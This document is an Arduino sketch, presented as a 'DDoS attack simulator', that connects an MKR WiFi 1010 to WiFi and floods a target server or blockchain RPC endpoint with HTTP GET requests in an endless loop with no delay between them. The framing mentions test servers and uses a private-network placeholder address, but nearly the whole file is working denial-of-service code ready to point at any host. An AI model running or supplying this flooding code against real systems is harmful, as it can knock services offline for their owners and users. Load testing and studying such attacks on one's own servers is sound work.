// Arduino sketch: DDoS Attack Simulator
// This sketch simulates a Distributed Denial of Service attack by flooding the target server 
// (or blockchain RPC endpoint) with rapid HTTP requests. It continuously sends dummy data 
// to overwhelm the server.
// Hardware: Arduino MKR WiFi 1010 (WiFiNINA used for connectivity).

#include <WiFiNINA.h>

const char* WIFI_SSID     = "YOUR_WIFI_SSID";         // replace with your WiFi network name
const char* WIFI_PASSWORD = "YOUR_WIFI_PASSWORD";     // replace with your WiFi password
const char* TARGET_HOST   = "192.168.1.100";          // target server IP or hostname (e.g., Flask server or node)
const int   TARGET_PORT   = 5000;                     // Target server port (e.g., 5000 for Flask, or 8545 for local Ethereum node)

WiFiClient client;

void setup() {
  Serial.begin(9600);
  // Connect to WiFi
  WiFi.begin(WIFI_SSID, WIFI_PASSWORD);
  Serial.print("Connecting to WiFi...");
  while (WiFi.status() != WL_CONNECTED) {
    delay(500);
    Serial.print(".");
  }
  Serial.println("\nWiFi connected. Starting DDoS attack simulation...");
}

void loop() {
  // Rapidly send HTTP requests in an endless loop
  if (client.connect(TARGET_HOST, TARGET_PORT)) {
    // Send a minimal HTTP GET request or dummy POST to flood the server
    client.println("GET / HTTP/1.1");
    client.print("Host: "); client.println(TARGET_HOST);
    client.println("Connection: close");
    client.println();
    
    // Optionally, send a tiny payload if needed to simulate data volume
    // client.println("Attack");
    
    // Close the connection immediately to free socket for next request
    client.stop();
    
    // (No delay here to maximize request rate – this will hammer the target as fast as possible)
  } else {
    // If connection fails (server could be overwhelmed), print an error and continue trying
    Serial.println("Connection failed – server may be down or saturated.");
    client.stop();
    delay(100); // brief pause before retrying to avoid tight spin on failure
  }
  
  // Note: This infinite loop will generate a very high number of requests.
  // Use with caution on test servers. Adjust or add delays as needed to modulate attack intensity.
}
